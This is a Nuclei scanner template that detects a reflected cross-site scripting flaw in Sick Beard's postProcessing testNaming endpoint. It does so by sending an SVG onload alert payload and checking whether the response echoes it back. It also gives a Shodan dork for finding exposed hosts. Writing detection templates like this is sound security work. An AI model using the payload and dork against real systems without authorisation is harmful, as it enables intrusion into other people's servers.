# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: Sick-Beard-XSS
# Vendor Homepage: https://sickbeard.com/
# Software Link: https://github.com/midgetspy/Sick-Beard
# shodan dork: sickbeard
info:
  name: Sick Beard XSS
  author: pikpikcu
  severity: medium
http:
  - method: GET
    path:
      - "{{BaseURL}}/config/postProcessing/testNaming?pattern=<svg/onload=alert('xss')>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<svg/onload=alert('xss')>"
        part: body
